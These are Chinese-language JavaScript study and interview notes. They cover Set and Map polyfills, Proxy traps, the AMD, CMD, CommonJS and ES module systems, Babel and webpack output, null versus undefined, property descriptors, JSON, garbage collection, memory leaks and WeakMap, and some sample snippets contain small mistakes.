				    _iterator.return();
				}
			    } finally {
				if (_isError) {
				    throw _error;
				}
			    }
			}
		
	
	6. Map 与 Set
	
	公有方法：has()、delete()、clear()
	
	Map 与 Set 是数组和对象外表示集合的数据结构「不是对象」
	
	 (1) Set [所有成员都是唯一的]
	 
	     	const s = new Set(); // Set 构造函数接受 iterator 数据结构
		* 底层用数组实现 
		  [[Entries]] 属性: [0 ,1, 2, 3]
		
		* 没有键名只有键值
		  [[Entries]] 数组只暴露了访问数组值的方法

	     
	     数组去重：[...new Set(array)]
	     
	   a. 模拟实现一个 Set 数据结构
	   
	       Q. indexOf 实现 [底层使用 '===']
	            
		    NaN !== NaN
	   
	       Q. NaN 不会重复添加
	       A. 实现 NaN 去重 => 编码替换为独一无二数据后，再用 indexOf() 判断

	             1) 普通传入 val -- encodeVal
		     2) 遍历 --- decodeVal
		     
		     栗子：
		          var NaN = Symbol('NaN');

		          var encodeVal = function (value) { // 替换 NaN 
			      return value !== value ? NaN : value;
		          }
		          var decodeVal = function (value) {
			      return (value === NaN) ? NaN : value;
		          }
	       
	       2. 实现 Iterator，且没有 key，只有 value -> [entries() ]
	       
	             1) 难点：部署 [Symbol.iterator] 接口 [有点绕]

			    

			    var makeIterator = function (arr, iterator) {
				    var i = 0;

				    // new Set(new Set()) 会调用这里
				    var obj = {
					next: function () {

					    var done = i >= arr.length
					    var value = done ? iterator(arr[i++]) : void 0 // 闭包，但仍可以访问 iterator

					    return {done, value}
					}
				    };

				    // [...set.keys()] 会调用这里
				    obj[Symbol.iterator] = function () { // 部署接口
					return obj
				    }

				    return obj // iterator 对象
				}

				function forOf(obj, cb) {
				    let iterable, result;

				    if (typeof obj[Symbol.iterator] !== "function") 
				    	throw new TypeError(obj + " is not iterable");
					
				    if (typeof cb !== "function") 
				    	throw new TypeError('cb must be callable');

				    iterable = obj[Symbol.iterator]();

				    result = iterable.next();
				    while (!result.done) {
					cb(result.value);
					result = iterable.next();
				    }
				}

				function Set(data) {
				    this._values = [];
				    this.size = 0;

				    forOf(data, (item) => {
					this.add(item);
				    })

				}

				Set.prototype['values'] = Set.prototype['keys'] = function () {
				    return makeIterator(this._values, function (value) { 
					return decodeVal(value); 
				    });
				}

				Set.prototype[Symbol.iterator] = function () {
				    return this.values();
				}

	   
	   
 	 
	 (2) Map
	     解决了对象只能用字符串作为 key 的问题「更完善的hash结构」
	     
	     方法：get()、set(key, val)
	        
		/*接受具有Iterator接口，且成员是双元素数组的数据结构*/
	        const m = new Map([
		  [o, 'Hello Map'],
		  ['xy', 18]
		]);
		
	      a. 模拟实现
	          
	               var map = { /*实际'key'与'value'还是String类型*/
			  0: {
			    key: any
			    value: any
			  }
			}
		
	 
			
			
五：proxy

     修改某些操作的默认行为「语言层面的修改」：只有操作proxy实例才起作用!
     proxy 的最大问题在于浏览器支持度不够，而且很多效果无法使用 poilyfill 来弥补
     
     
     Proxy 比 defineProperty（只能劫持对象属性） 可以重定义更多的行为
     
     	(1) Proxy 可以直接监听对象而非属性「劫持整个对象」
	(2) Proxy 可以直接监听数组的变化「弥补 vue 缺陷」
	(3) Object.defineProperty 只能遍历对象属性直接修改

        1. 使用
	   new Proxy(target, handler);
	    参数：
	       target：要拦截的目标对象
	       handler：一个对象，用来定制拦截行为「未设置任何拦截 == 原对象」
	       
	       
	    需求：需要地址信息（省市信息拼接而成）   
	      a. 直接在 person 上声明 address 属性 -> 污染了原有对象
	      b. 用到 address 信息时，再通过 person 拼接 -> 不灵活
	      
	         const person = {
		    name: 'xiaoyun',
		    province: '江苏省',
		    city: '南京市'
		  }

	   
	   
	2. 劫持对象属性
	
		  const proxy = new Proxy(person, {
		    get (target, name) { /*同理可以扩展基本操作*/
		      switch (name) {
			case 'address': /*虚拟属性*/
			  return `${target['province']}-${target['city']}`
			default:
			  return target[name]
		      }
		    }
		    set () {
		      // 若不设置会保持默认行为 [ proxy.city = 昆明 => （会影响person.city）] 
		    }
		  })
		  proxy.address // 江苏省-南京市

		
	 
	 3. 拦截函数的调用

		var target = function () { return 'I am the target'; };
		/* apply() 的参数：
		    targt: 目标对象		  
		    context: 目标上下文对象
		    args: target 的参数数组
		 */
		var handler = {
		  apply () {
		    return 'I am the proxy';
		  }
		};

		var p = new Proxy(target, handler);
		p(); // "I am the proxy"
		
		
	4. has：拦截 HasProperty 操作 [判断对象是否具有某个属性时，该方法会生效]
	
	   demo：vue 源码中 proxy 的使用
	   
		const hasHandler = {
		    has(target, key) {
			const has = key in target
			const isAllowed = allowedGlobals(key) ||
			    (typeof key === 'string' && key.charAt(0) === '_' && !(key in target.$data))
			if (!has && !isAllowed) {
			    warnNonPresent(target, key)
			}
			return has || !isAllowed
		    }
		}
		initProxy = function initProxy (vm) {
		    // 判断浏览器是否支持 proxy
		    if (hasProxy) { 
		      const options = vm.$options
		      const handlers = options.render &&
			? getHandler // 使用 template 编译为 render 方法
			: hasHandler
		      vm._renderProxy = new Proxy(vm, handlers)
		    } else {
		      vm._renderProxy = vm
		    }
		  }
		}
		
	 
	 5. 拦截自身属性读取
	 
	      具体拦截一下操作：for...in、Object.keys()、Object.getOwnPropertyNames()
	 
	  	let target = {
		  _bar: 'foo',
		  prop: 'baz'
		};

		let handler = {
		  ownKeys (target) { /*拦截第一个字符为下划线属性名*/
		    return Reflect.ownKeys(target).filter(key => key[0] !== '_');
		  }
		};

		let proxy = new Proxy(target, handler);
		for (let key of Object.keys(proxy)) {
		  console.log(target[key]); // "baz"
		}
		
	

六：前端模块化

    Browsersify、Webpack 一开始的目的就是打包 CommonJS 模块。
	
      一：模块化
      
           模块就是实现特定功能（不同的函数 + 变量）的一组方法
	     私有：内部数据与实现
	     通信：暴露的接口
	   
	   
         1. 为什么要使用模块
           
	   可维护性 [vue 就将功能模块拆分的非常清楚]，每个模块都是独立的，维护一个独立模块比一团凌乱的代码轻松很多
	   
	   希望一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取
	
         2. 模块化的发展
          
	    I. 全局 function 模式
	       不同的功能封装为不同的全局函数
	       
	       1. 命名空间污染，与其他模块变量命名冲突
	       2. 看不出任何依赖关系
	      
		      <script src="m.js"></script>
		      <script src="c.js"></script>

			/*全局作用域*/
			function m1(){
			  //...
			}
			function m2(){
			  //...
			}
			function c1(){
			  //...
			}
	 
	    II. IIFE + 简单对象封装
	       
	       1. 闭包形成了模块的私有作用域
	       2. window 添加属性 [对象封装] 向外暴露接口
	      	
			<script src="jquery.js"></script>/*按引用顺序加载脚本*/
			<script src="module.js"></script>

			/*module.js文件*/
			(function(window, $) {

			  let data = 'private'/*私有数据*/
			  function foo() {
			    console.log(`foo() ${data}`)
			    $('body').css('background', 'red')
			  }
			  function bar() {
			    otherFun()
			  }
			  function otherFun() {}/*私有方法*/
			  window.myModule = { foo, bar }/*es6 对象扩展*/
			})(window, jQuery)
	  
	  	
		3. 依赖管理：一定需要按照依赖关系加载，不利于维护。一个页面需要引入多个 js 文件
	        4. 依赖模块较多的话，发送多个请求
		
	
	二： 模块化规范
	     
		demo 为：四种模块加载规范：只用引入一个入口 index.js，其他模块自动加载 
		* project/
		    * index.html
		    * vender/
			* main.js
			* require.js
			* add.js
			* square.js
			* multiply.js
	     
	     AMD(Asynchronous Module Definition)
	       推广 require.js 过程中对模块定义的规范化
	  
	       模块的加载不影响后面语句的执行，所有依赖这个模块的语句，都定义在一个回调函数中（模块加载完执行）
	   
	
		    I. 规范只定义了 define() 函数，require.js 为全局添加了 define 函数

		       define(id?, dependencies?, factory) 

			 * id「字符串」：定义中模块的名字（省略默认脚本名）

			 * dependencies：所依赖模块id数组

			 * factory：初始化模块要执行的函数或对象


		   II. require.js [依赖前置]
			 require.js 会自动分析依赖关系，将需要加载的模块正确加载

			基于 AMD 规范实现的函数：require(Array, Function)

			  * Array：加载依赖的模块
			  * Function：回调函数
		 
	   	
	       模块加载 demo：
	       
			// index.html
			/*data-main="vender/main" 表示主模块*/
			<script data-main="vender/main" src="vender/require.js"></script>
	

		        // main.js
			// 首先用config()指定各模块路径和引用名
			require.config({ /** main.js 入口文件/主模块 **/
			  baseUrl: "js/lib",
			  paths: {
			    "jquery": "jquery.min",  //实际路径为js/lib/add.min.js
			    "square": "square.min",
			  }
			});
			require(['add', 'square'], function(addModule, squareModule) {
			    console.log(addModule.add(1, 1))
			    console.log(squareModule.square(3))
			});


			// add.js
			define(function() {
			    console.log('加载了 add 模块');
			    var add = function(x, y) {　return x + y; };

			    return { add: add };
			});	


			// square.js
			define(['./multiply'], function(multiplyModule) {
			    console.log('加载了 square 模块')
			    return {　　　　　　
				square: function(num) {
				    return multiplyModule.multiply(num, num)
				}
			    };
			});

			// multiply.js		
			define(function() {
			    console.log('加载了 multiply 模块')
			    var multiply = function(x, y) {　return x * y; };

			    return {  multiply: multiply };
			});

			而如果我们在浏览器中打开 index.html，打印的顺序为：
			加载了 add 模块
			加载了 multiply 模块
			加载了 square 模块
			2
			9

	     CMD： 在 sea.js 推广过程中模块定义的规范化
	       模块加载是同步的，只有加载完成，才能执行后面的操作
	   
		   define(factory)
		   
		     * factory；为函数时模块构造方法，可以得到模块向外提供的接口
		     * factory(require, exports, module) -- 注入环境变量？

	    	   require(id): 同步加载模块
	   
		(1) sea.js [就近依赖]

			
                    加载 demo：
		    
			 // index.html	
			 <script src="vender/sea.js"></script>
			 <script>
			 // 加载主模块
			 seajs.use("./vender/main");
			 </script>


			// main.js
			define(function(require, exports, module) {
			 var addModule = require('./add');
			 console.log(addModule.add(1, 1))

			 var squareModule = require('./square');
			 console.log(squareModule.square(3))
			});

			// add.js
			define(function(require, exports, module) {
			 console.log('加载了 add 模块')
			 var add = function(x, y) {　return x + y; };
			 module.exports = {　　　　　　
			add: add
			 };
			});

			// square.js
			define(function(require, exports, module) {
			 console.log('加载了 square 模块')
			 var multiplyModule = require('./multiply');
			 module.exports = {　　　　　　
			square: function(num) {
			   return multiplyModule.multiply(num, num)
			}
			 };
			});


			// multiply.js		
			define(function(require, exports, module) {
			 console.log('加载了 multiply 模块')
			 var multiply = function(x, y) {　
			return x * y;
			 };
			 module.exports = {　　　　　　
			multiply: multiply
			 };
			});

			而如果我们在浏览器中打开 index.html，打印的顺序为：
			加载了 add 模块
			2
			加载了 square 模块
			加载了 multiply 模块
			9
			
		总结：
		  由于 Node.js 主要用于服务器编程，模块文件一般都已经存在于本地硬盘，所以加载起来比较快，不用考虑非同步加载的方式
		  所以 CommonJS 规范比较适用

		  但是，如果是浏览器环境，要从服务器端加载模块，这时就必须采用非同步模式，因此浏览器端一般采用 AMD 规范
	  
	     
	     CommonJs 【就近依赖】
	     
	         Node 应用是由模块组成，使用 CommonJS 规范 [每个文件就是一个模块，有自己的作用域，就像闭包一样]
		 在文件中定义的变量、函数、类，都是私有的，对其他文件不可见
		 
			    
	     2. 环境变量
	        有四个重要的环境变量为模块化的实现提供支持：module、exports、require、global
		
		(1) 核心：模块的加载实质上就是，注入 exports、require、module 三个全局变量，然后执行模块的源码，
		      
		      function Module(id, parent) {
			  this.id = id; /*模块名*/
			  this.exports = {};/*输出接口的copy, 以后需要用到这个模块的时候，就会到 exports 属性上面取值*/
			  this.loaded = false;/*模块是否加载完成*/
			  ...
			}

			module.exports = Module;
			var module = new Module(filename, parent);
			
		(2) require [加载]
		    自动分析依赖关系，将需要的模块正确加载
		    
		    1. require 加载模块
		    2. module.exports 输出
		
			Module.prototype.require = function(path) {
			  return Module._load(path, this);
			};
			/**
			 * 模块可以多次加载，但是只会在第一次加载时运行一次，然后运行结果就被缓存了
			 * 
			 * 1. 读取内存中缓存模块 [清除系统缓存可以再次运行模块]
			 * 2. 没有缓存，生成 Module 实例，存入缓存
			 * 3. 加载 module，输出 module.exports 属性
			 */
			Module._load(path, this) {
			  ...
			  var content = fs.readFileSync(filename, 'utf8');/*将 module 读取为字符串，再编译该模块*/
 			  module._compile(content, filename);

			  return module.exports;
			}
		
		(3) 加载之前的栗子：
		
		    	// main.js
			var add = require('./add.js');
			console.log(add.add(1, 1))

			var square = require('./square.js');
			console.log(square.square(3));
			
			
			// add.js
			console.log('加载了 add 模块')

			var add = function(x, y) {　
			    return x + y;
			};

			module.exports.add = add;
			
			
			// multiply.js
			console.log('加载了 multiply 模块')

			var multiply = function(x, y) {　
			    return x * y;
			};

			module.exports.multiply = multiply;
			
			
			// square.js
			console.log('加载了 square 模块')

			var multiply = require('./multiply.js');

			var square = function(num) {　
			    return multiply.multiply(num, num);
			};
			
			如果我们执行 node main.js，打印的顺序为：加载模块是同步的，只有加载完才能执行后边的操作
			加载了 add 模块
			2
			加载了 square 模块
			加载了 multiply 模块
			9

		
		2. 循环加载
		    
		    CommonJs：某个模块被"循环加载"，就只输出已经执行的部分，不是代码全部执行后的值
		    
		    栗子：
		      a.js代码如下:

			exports.done = false /*执行代码*/
			var b = require('./b.js') /*a 停止执行，等待 b 执行完毕，再往下执行*/
			
			console.log(b.done); // true
			exports.done = true;

		      再看b.js的代码:

			exports.done = false;
			var a = require('./a.js') /*“循环加载”，只能取到 done = false*/
			
			console.log(a.done); // false
			exports.done = true;
		   
		   
		   es6：我们来看看es6是怎么处理循环加载的
		     es6 模块是 Js 静态分析 -- 编译时输出接口引用，需要小心循坏引用时取不到值   

		   栗子：
		   
		      a.js如下：
		      
			import {bar} from './b.js' /*a 加载 b*/
			
			console.log(bar);
			export let foo = 'foo';

		      b.js如下：
		        
			import {foo} from './a.js' /*已经存在了 a 的接口引用，继续执行*/
			
			console.log(foo)  /*报错, undefined*/
			export let bar = 'bar';

		      a.js：/*解决方法：让 b.js 运行的时候，foo 已经有定义了*/
		      
			function foo() { return 'foo' }/*变量提升「函数声明」*/
			export {foo};
	

		4. es6、CommonJs	的两个重大的差异

		      * CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用     
		      * CommonJS 调用一个函数（require）， 返回一个对象（module.exports [浅 copy]），就是这么简单
		        
		     
		     在 CommonJS/AMD 中，你可以这样写：

			/*这段代码在仅仅被 parse 成 AST 时，很难分析出究竟依赖了哪些模块，哪些接口*/
			const foo = require(`all/${['f', 'o', 'o'].join('.')}`)

			import foo from 'all/foo' /*es6 很容易分析使用的模块*/

	
	     es6 [依赖前置 '严格模式'] 
	
		     (1) 主模块
		         浏览器加载 es6 模块，也使用 <script> 标签，但加入了 type="module" 属性
		     
		         <script type="module" src="./foo.js" defer></script>

		     (2) 加载 demo： 	
  			        // index.html	
			        <body>
				    <h1>Content</h1>
				    /*加载的主模块*/
			    	    <script src="vender/main.js" type="module"></script>
			        </body>
			    
			    
				// main.js
				import {add} from './add.js';
				console.log(add(1, 1))

				import {square} from './square.js';
				console.log(square(3));
				

				// add.js
				console.log('加载了 add 模块')

				var add = function(x, y) { return x + y; };
				export {add}


				// square.js
				console.log('加载了 square 模块')
				import {multiply} from './multiply.js';

				var square = function(num) { return multiply(num, num); };
				export {square}


				// multiply.js
				console.log('加载了 multiply 模块')

				var multiply = function(x, y) { return x * y; };
				export {multiply}


				而如果我们在浏览器中打开 index.html，打印的顺序为：
				加载了 add 模块
				加载了 multiply 模块
				加载了 square 模块
				2
				9
			
			
		   模块的继承：export * from 'circle'「没什么意义吧.. 覆盖了circle模块的输出」
			
	 	   2) import [模块的对外接口]
		      
		      静态解析：import foo from 'foo'
		      export default 输出的是一个值
		        
			1. 限定语法 -- 让本来需要运行代码才能确定的依赖，可以在分析 AST 阶段就确定下来
			
			     es6 所有 import 和 export 都是在代码执行前 resolve 好的，当然我们也有 lazy loading 或按需加载的需求，即在运			     行时才进行模块加载 [es6 异步的模块动态加载 API]
			
			2. 符号连接 -- 实际上是建立符号的映射
			
			  I. 如 x 模块中import {a as b} from 'y' 表示的是将 x 模块中的b符号映射到 y 模块的 a 符号
			       生成了一个只读引用，等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值
			  
			  II. 在 x 中操作 b 本质上就是操作 y 的 a [映射是不可变的, 所以你也不能在 x 模块中执行 b = ... 操作]
		

		   
		        定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块
			单例模式：
			
			  	import { foo } from 'my_module';
				import { bar } from 'my_module';

				// 等同于
				import { foo, bar } from 'my_module';

			
			I. 命名： import { 变量名[等于对外接口名称] } from '路径'
			  
			II. 重命名（as 关键字）：import { name as newN }
			    
			III. 整体加载（*）：import { * as newN }/*一个模块提供所有功能都加载在该对象上面*/			    
			    
			  
		   3) export [必须与模块内部的变量建立一一对应关系]
		   
	   	      export输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值
			
			    栗子：
				export 1 /*没有提供对外的接口，1只是一个值，而不是接口*/
				 或
				var m = 1;  export m;

			命名： export { 变量1,  变量2, 变量n } /*输出变量引用*/
			  
			  
			重命名（as 关键字）： export {变量 as newN}
			    
			    
			 c. 指定的模块默认输出：敲黑板!![重点]
			 
			 export default {} /*输出一个值*/
			  
			    本质：方便太多了呀！
			      I. export default就是输出一个叫做default的变量（方法），然后允许你为它取任意名字
			      II. 将 default 后面变量的值，赋给default变量
			      
			      export default var a = 1; √
			      export 42; ×
			      export default 42; √
			      

			
		   4) 动态加载提案：import()「重要呐!!路由懒加载」
		   
		        返回一个 promise 对象, resolve() 时的值为输出的模块
			
			  /*vue 中路由懒加载的应用*/
			  /*使得在路由切换的时候能够动态的加载组件渲染视图*/
			  if (true) {
			    import ('module.js') .then(res => {
			      console.log(res)
			    })
			  }
			  

		(2) Babel 编译
		
		Babel 只是把 ES6 模块语法转为 CommonJS 模块语法，然而浏览器是不支持这种模块语法的!
		所以直接跑在浏览器会报错的，如果想要在浏览器中运行，还是需要使用打包工具将代码打包
		
		    1) 编译 import
			import {name, year} from './profile';

			// Babel 编译后
			'use strict';
			
			var _profile = require('./profile');
		    
		    2) 编译 exports
			var name = 'Michael Jackson';
			var year = 1958;
			export {name, year};
		    
			// Babel 编译后
			'use strict';

			Object.defineProperty(exports, "__esModule", {
			  value: true
			});
			var name = 'Michael Jackson';
			var year = 1958;

			exports.name = name;
			exports.year = year;

		
		(3) webpack 打包
		
		    首先为什么浏览器中不支持 CommonJS 语法呢？这是因为浏览器环境中并没有 module、 exports、 require 等环境变量！
		    换句话说，webpack 打包后的文件之所以在浏览器中能运行，就是靠模拟了这些变量的行为。
		    
		
			function(module, exports, require) { /*webpack 会将其包裹一层，注入这些变量*/
			    console.log('加载了 square 模块');

			    var _profile = require('./profile');
			    module.exports = {
			      name;
			      year;
			    }
			}
	

	
							js面试
							
零、 null 和 undefined

      1. null
         用来表示特殊值，常用来描述空值，
	 
            * typeof null === 'object' [typeof 原理]
	    * null 是其自有类型的唯一成员，可以表示对象、数组、字符串是无值的，可以认为 null 是一个特殊的对象值，含义是非对象
	 

      2. undefined
         用未定义的值表示更深层次的空值
	  
            * 表示变量还没有初始化 [变量的取值]
            * 表示这个属性或元素不存在 [对象属性或数组元素]
            * 函数未返回值、没有实参的形参

undefined 是程序级的、出乎意料的或类似错误的值的空缺，null 表示正常的意料之中的值空缺，或将他们作为参数传入，null 是最佳选择。
							
							
							
一、 底层实现

      1. 编译原理
      
            * 编译型语言：
	         有一个负责翻译的程序（编译器 Compiler）来对我们的源代码进行转换，生成相对应的可执行代码
		 
            * 解释型..：
	         在程序运行之前，还只有源程序而没有可执行程序。而程序每执行到源程序的某一条指令，解释器程序（v8解释器）将源代码转换成二进制代码
		 以供执行 [将编译的过程放到了执行过程中，不断的解释（编译） -> 执行]
		 

      2. 数据类型
      
            * 动态类型语言：
	         不用给任何变量指定数据类型，会在你第一次赋值给变量时，记录内部的数据类型
		 
            * 弱类型语言：
	         一个变量可以赋值不同的数据类型（不同类型转换）


二、 JavaScript 的实现

      1. ECMAscript
         ECMA 只是规定了这门语言的基础，在此基础上可以构建更完善的脚本语言
	 
            * 宿主环境 [Node、浏览器]
	       
	       (1) 提供基础的 ECMA 的实现
	       
	       (2) 提供语言的扩展，以便语言与环境之间的交互
	           这些扩展如 DOM，则利用 ECMA 核心类型与语法提供更多更具体的功能，以便实现针对环境的操作  
		     
	       
	    * null 是其自有类型的唯一成员，可以表示对象、数组、字符串是无值的，可以认为 null 是一个特殊的对象值，含义是非对象
	 

      2. undefined
         用未定义的值表示更深层次的空值
	  
            * 表示变量还没有初始化 [变量的取值]
            * 表示这个属性或元素不存在 [对象属性或数组元素]
            * 函数未返回值、没有实参的形参
	    

      3. undefined





一、 内存空间
      1. Js 自己执行了内存分配，同时声明了值
         
	   Js 执行时，会将不同变量存于内存中的不同位置
	   
	    ┌──────────┴────────────┐
	    │         stack         │ 
	    └──────────┬────────────┘      ┌───────────────┐
	    ┌──────────┴────────────┐      │    heap       │
	    │      原始类型的变量     │      │    	      │
	    │  	    （按值访问）	│ -->  |    存对象      |
	    └──────────┬────────────┘      │               │
	    ┌──────────┴────────────┐ -->  └───────────────┘
	    │        对象的引用       │     
	    └───────────────────────┘
	    
	    赋值操作：
	      1. 原始类型：由名称和对应值（undefined）组成一个变量对象的属性被创建，然后复制值到新变量创建的位置
	      
	      2. 对象：引用指向堆中同一地址
	    
	    (1) 什么是对象？
	    
	          1) 属性的无序集合（包含相关数据和方法），通常由变量和函数组成，称为变量的属性和方法
		  
		  2) 每个属性都是名值对。属性名是字符串，因此我们可以把对象看成是从字符串到值的映射
		     
		  3) 属性类型  
		     es5 每个属性还有一些与之关联的内部值，描述了属性特性
		       
		       a. '属性描述符' 的对象 [descriptor]
		       
		             1. 数据属性

				     var obj = {};
				     // 下述属性都是默认值
				     Object.defineProperty(obj,"o",{
					 configurable:false, // delete 删除、不能修改配置 [writable除外]、不能转换为访问器属性
					 enumerable:false, // for...in 是否可以返回属性
					 value: undefined, // // 属性包含的值
					 writable:false,
				     });  
			     
			     
			     
			     2. 访问器属性
			        不具有值(value)特性 [getters决定] 与可写性 [setters 决定]
				监听数据属性的变更

				     Object.defineProperty(obj,"o",{
					 get:function (){} | undefined, // 读取属性调用
					 set:function (val){} | undefined // 写入属性调用「忽略其返回值」
					 configurable: false,
					 enumerable: false
				     });
				     
				     
		       b. 方法
			     
			     1. get '属性描述符' 的对象
			     
			          Object.getOwnPropertyDescriptor(prop)
		       
		       
			     2. set 属性特性
			        属性特性是数据属性与访问器属性两者之一
				
			          Object.defineProperty(obj, prop, descriptor)/*descriptor 字段是必须的*/
				  
				  	var o = {};
					o.a = 1;
					// => 等同于
					Object.defineProperty(o, "a", // 通过代码给对象创建所有属性都是可写、可枚举和可配置的
							      {
								value : 1,
								writable : true,
								configurable : true,
								enumerable : true
							      });
				     
		     
		      
		       2.1 属性的查询设置
		           
			   a. '.'
			     栗子：obj.a [标识符]
			          标识符是静态的（因为不是数据类型，无法修改呐），必须写死...
			   
			   b. 关联数组对象
			      栗子：obj[a] [字符串] -- 好像自动会 toString()
				   字符串是数据类型，变量可以为字符串类型，可以动态查询
				   
		       2.2 删除、检测属性
		       
			   a. delete
			      只能删除自有属性（继承：×）
		        

		  
	        创建对象：对象字面（直接）量 [是一个表达式，表达式每次运算都创建并初始化一个新的对象]
			new()、Object.create()	  
			
			 字面量对象 `{}` -- Js 中大括号的用法：
			 
			    * 函数声明 / 表达式 中用于括住函数体
			    * 块语句 「for、while 等流程控制语句中」
			    * 对象字面量（Object Literal；或者叫对象初始化器，**Object Initializer**）

			    function foo {
			      while (false) { age : 2 } // 块语句
			      { age: 1 }   // 同上
			      ({ age: 3 }) // 对象字面量 => 花括号在!表达式!中
			    }
		  
		  
		  3) 对象的划分
		  
			* 内置对象：ECMAScript 规范定义的对象或类

			* 宿主对象：Js 解释器嵌入的宿主环境（如浏览器）定义的

			* 自定义对象：执行代码所创建的对象
		  
		  除了包含属性之外，每个对象还拥有3个相关的对象特性，下面说一下两个重要相关属性
		  
			1. prototype：对象的原型是用来 "继承" 属性的

			2. [[class]]：引擎实现
			   表示对象类型信息的字符串
			   很多对象继承重写了 toString，只有通过 Object.prototype.toString() 调用
		  
		  4) JSON 内置对象
		     最重要的是理解它是一种数据格式，不是编程语言
		       
		       JSON 是轻量级的数据格式，可以表示复杂数据结构的工作量
		     
		     1. JSON 数据类型
		     
		          (1) 简单值：使用与 Js原始类型 相同的语法，有两个特殊情况
			      * 不支持 undefined
			      * 字符串: 与 js 字符串最大区别就是，JSON 字符串必须使用 ""（单引号会语法错误）
			      
		          (2) 对象
			      * 要求给属性加 ""（双引号）
			  
			  (3) 数组
			      * Js 数组的字面量形式
		        
			
		     2. 解析与序列化
		        JSON 数据结构可以转化为 Js 对象
			
			  (1) eval() 
			      早期的 JSON 解析器
			      
			        var json1 = eval({ // 对象
				  "name": "JSON",
				  "age": 18
				})
				var json2 = eval([1, 2, 3]) // 数组
				
			  (2) JSON [es5 定义了内置对象 JSON]
			      
			        a. Js 对象序列化为 JSON 字符串
				   忽略函数和原型成员、不可遍历属性、undefined [结果中都是值为有效 JSON 数据类型实例属性]
				
					1. JSON.stringify(value[, replacer [, space]]) 

						  * value: 将要序列化的对象
						  * replacer: function(key, value) | Array
						    * function: 每个属性值都会经过该转换处理
						    * Array: 只有 Array 包含的属性才序列化
						  * space: 每个级别缩进
				
				
					2. toJSON: function () {}
					   如果对象有自定义 toJSON() 方法，JSON.stringify() 会使用这个方法的返回值作为参数，
					   而忽略原对象的其他属性

						    * function: 每个属性值都会经过该转换处理
				
				
			        b. 解析 JSON 转化 Js 数据类型
				
					1. JSON.parse()
					
					     * value: 将要转化的JSON数据类型
					     * reviver: function(key, value)
						* function: 每个属性值都会经过该转换处理
			      

	 
	 
            (2) 每个数据都需要内存空间「栈内存和堆内存」
        	
		  1) primitive 放在栈中，而引用数据类型放在堆中。
        	  2) 能量是守恒的，无非就是空间换时间、时间换空间的问题「堆比栈大，栈比堆运算速度快，对象是一个复杂的结构，并且可以自由扩展」
		  
	    
	    (3) 创建对象的多种方式
	  
	
      2.内存管理
      
        (1) 引用计数算法: 
	      最简单垃圾回收算法, 一个对象被0引用时, 可被回收 -- 循坏引用问题
	      
	(2) 清除标记算法: 
	      从根部（在 Js 中就是全局对象 [浏览器：window，node：global]）出发定时扫描内存中的对象「检查他们的后代变量」
	      =>  一个对象有零引用"导致该对象不可达", 循坏引用不一定可达


      3.常见内存泄漏 [堆内存]
        举列子：闭包中的 this, 对象函数。匿名函数返回函数 return function「溢出与泄漏」
      
        (1) 全局变量 [不会被垃圾回收器所收集的]
	    -> let 和 const
	    
	    function foo(arg) {
 	      bar = {}; // 内存泄漏
	    }
	    'use strict' 严格模式
	    
	    
	 (2) DOM 泄漏
	     -> 当使用观察者模式时，记得明确的移除他们 
	     -> clearInterval(timeoutId);
	     
	     // 定时器及被遗忘回调
	     var data = loadData();

	     var timeoutId = setInterval(function() { 
	       // 页面 removeChild(render) 之后，古老的浏览器无法回收
	       // 仍然保存元素和回调的引用，不过大多数现代浏览器都会帮你处理
	       var render = document.getElementById('render');
	       if (render) {
	         render.innerHTML = JSON.stringify(data);
	       }
	     }, 5000);
	   
	   
	 (3) 闭包
	       为同一父作用域闭包创建作用域，该闭包会共享作用域
	       
	          function parent () {
		    function A () {}
		    function B() { // A 共享 A、B作用域
		      A()
		    }
		  } 
	       
	   	  /**
		   *  1. method 共享 unused 作用域
		   *  2. 函数外 global 引用 method，method 共享作用域 -> unused 不会被释放
		   */
		  var global = null;
		  
		  var replaceObj = function () {
		    var obj = global;
		    
		    var unused = function () {
		      if (obj) /*method 闭包作用域*/
		    };

		    global = { /*全局变量*/
		      method: function () {}
		    };
		  };

	   
	  (4) DOM 引用
	      1. 在数据结构中存储 DOM 结点
	      
	      栗子：存储一个 <table-cell> 结点，当你从 DOM 中移除了 <table> 结点，却仍保持对 <table-cell> 引用
	      -> 这会导致大量内存泄漏! 因为单元格是表格的后代元素，导致整个表格的内存都无法释放
	      
	   
	  (5) weakMap [最大好处：避免内存泄漏]
	  
	      key 引用对象的弱引用，不可遍历 <= 内部对象与不可预测的垃圾回收机制相关, （core：）无法确定内部对象
	        
		温习 Map：
		  const m = new Map()
		  m.set(key, val)/*解决了字符串为 key 的问题*/
		
		1. 只接受对象为 key
		
		      const map = new WeakMap();
		      map.set(1, 2)// TypeError
	      
	      1) 弱引用
	           只和内存中的对象有关，我们操作（map、weakmap）的只是引用而已 [引用与指针]
	      
	         弱引用的引用的对象可能被垃圾回收器回收的，强引用则不会。 
		 
		    在 Js 中，一般我们创建一个对象，都是建立一个强引用：
			 
				  let map = new Map();
				  let key = new Object(); /*创建了一个对象 obj*/
				  map.set(key, 1);

				  // 只是去掉了 key 对 obj 的强引用, 并没有去掉 map 对 obj 的强引用
				  // key = null 不会导致 key 的原引用对象被回收
				  key = null;

				  map.delete(key)
			  
		    弱引用的对象：
		    
		       避免内存泄漏原理：key 被回收后，其实，WeakMap 也就不持有这个键值的引用了
	
				const wm = new WeakMap();
				let key = new Object(); /*创建了一个对象 obj*/
				wm.set(key, 1);/*vm 与 key 的弱引用，之前 key 建立强引用的关系， obj 不会被回收*/
				key = null;/*obj 被回收*/
				
		
	      2) 应用场景
	      
	          需要关联对象和数据，在不修改原有对象的情况下储存属性或者对象信息数据等（需要其他对象存储），但是不想管理这些数据的死活时
		  非常适合考虑使用 WeakMap
		  
		  修改原有对象：关联数据存储在 obj 引用的对象上，obj = null 去掉强引用后，对象  <- 垃圾回收
		  

	          
	       a. DOM 对象上保存相关数据
	       
	         1) h5 data-* 用于存储自定义数据：
		 
		      html: <div id="app" data-appId="287">
		   
		      Js: var appId = document.getElementById('app').dataset.appId [dataset: * 与 value 的映射]
		 
		 
	         2) $("#id").data('myid') // Jquery取到 data-myid 的值
		 
		     I: 在删除元素上储存帖子的 ID 信息)，jQuery（内部会使用一个对象）管理 DOM 和对应的数据。
		     II: 删除 DOM 元素（el = null），相关联的数据并不会被删除。
